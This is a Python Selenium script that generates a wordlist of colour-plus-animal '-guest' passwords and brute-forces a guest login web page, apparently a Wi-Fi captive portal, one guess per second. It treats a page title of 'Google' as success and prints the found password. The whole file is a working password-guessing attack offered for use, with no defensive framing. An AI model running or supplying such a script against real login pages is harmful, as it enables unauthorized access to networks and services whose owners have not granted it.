from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By 
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec 
import time,re

global list_colors,list_animals,list_passwd

list_colors = ['Green','Yellow','Black','White','Brown','Purple','Blue','Pink','Orange','Red','Grey',\
'Violet','Gold','Magenta']

list_animals = ['Pig','Fish','Monkey','Cat','Dog','Horse','Chicken','Sheep','Macropods','Ant','Tiger',\
'Penguim','Cattle','Wolf','Bird','Whale','Lion','Giraffe','Llame','Crocodile','Boar','Rabbit','Shark',\
'Cheetah','Fox','Elephant','Dolphin','Platypus','Goat','Goldfish','Snake','Chimpanzee','Bear','Bat',\
'Alligator','Gorilla','Squirrel','Eagle','Rhinoceros','Koala']

list_passwd = []

def create_dict():
	global total_passwords
	for item in list_colors:
		for item1 in list_animals:
			final_word = item+item1+'-guest'
			list_passwd.append(final_word)
	total_passwords = 0
	for item in list_passwd:
		total_passwords = total_passwords + 1 
	print('[>]Total number of passwords:',total_passwords)

def crack_password(link):
	print('[>]Starting the attack')
	bi = webdriver.Firefox(executable_path='/home/alyattes_Lion/Downloads/geckodriver')
	link_of_login_page = link
	bi.get(link_of_login_page)
	wait = WebDriverWait(bi,10)
	element = wait.until(ec.presence_of_element_located((By.ID,'guest-pass')))
	total_passwords_tried = 0
	for item in list_passwd:
		total_passwords_tried = total_passwords_tried + 1
		time.sleep(1)
		element.send_keys(item,Keys.ENTER)
		print('[>]Tried password:'+item)
		if bi.title == 'Google' : 
			print('[>]Password Found:'+item)
		if total_passwords_tried == total_passwords :
			print('[!]Password not in dictionary')

def main():
	create_dict()
	link = input('[>]Copy and Paste the link of the Log In Guest WebPage:')
	crack_password(link)

main()

